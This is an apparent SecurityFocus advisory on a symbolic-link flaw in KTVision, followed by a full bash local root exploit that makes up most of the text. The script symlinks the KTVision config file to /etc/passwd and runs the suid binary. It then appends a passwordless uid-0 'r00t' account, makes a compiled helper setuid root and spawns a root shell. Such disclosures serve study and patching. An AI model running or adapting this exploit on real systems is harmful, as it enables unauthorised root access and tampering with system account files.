source: http://www.securityfocus.com/bid/2913/info

KTVision works with frame-grabber cards and KDE (Unix K Desktop Environment) to support TV video display on the PC screen.

KTVision is vulnerable to symbolic link attacks.
It is possible for an attacker to anticipate the expected name of a KTVision config file. A local attacker can then create a symbolic link with the anticipated filename pointing to files on the system writable by ktvision, (which is frequently suid root).
This could allow an attacker to overwrite any file on the filesystem, completely undermining the the security of the exploited system.


#!/bin/bash

link=/home/paul/.kde/share/config
linkto=/etc/passwd
target=/opt/kde/bin/ktvision

echo ""
echo "KTVision <= 0.1.1-271 local r00t exploit by IhaQueR"
echo ""

if ! test -u $target ; then
        echo "[-] $target not found"
        exit 1
fi;

echo "[+] $target found"

rm -f sush*
cat <<__DUPA__>>sush.c
#include <stdio.h>
main()
{
        setuid(geteuid());
        setgid(getegid());
        execl("/bin/bash", "/bin/bash", NULL);
}
__DUPA__

echo "    compiling sush"
res=$(gcc sush.c -o sush)

if test "$res" != "" -o ! -x sush ; then
        echo "[-] failed"
        rm sush* ktvback.*
        exit 2;
fi;

echo "[+] success"

cp $linkto ktvback.$$
mkdir -p $link
rm -f $link/ktvisionrc
ln -s $linkto $link/ktvisionrc

echo ""
echo -n "now running... (ensure that X is up and running)"

$target >/dev/null 2>&1 &
cpid=$!

declare -i cnt
declare -i max
cnt=0
max=60

while ! test -O $linkto ; do
        sleep 1;
        printf "  %.2d" $cnt
        cnt=$(($cnt+1))
        if test $cnt -ge $max ; then
                echo ""
                echo ""
                echo "[-] FAILED"
                rm sush* ktvback.*
                exit 2;
        fi;
done;

kill -9 $cpid >/dev/null 2>&1
rm $link/ktvisionrc

echo ""
echo ""
echo "[+] SUCCESS, creating sush"
echo >>$linkto "r00t::0:0:root:/root:/bin/bash"
echo ""
su r00t -c "chown 0.0 sush; chmod u+s sush; chmod g+s sush; cp
ktvback.$$ $linkto; chown 0.0 $linkto"
rm ktvback.* sush.c

if ! test -u sush ; then
        echo "    hm strange error"
        rm sush* ktvback.*
        exit 1
fi;

echo ""
echo "starting ./sush"
./sush

#!plonk
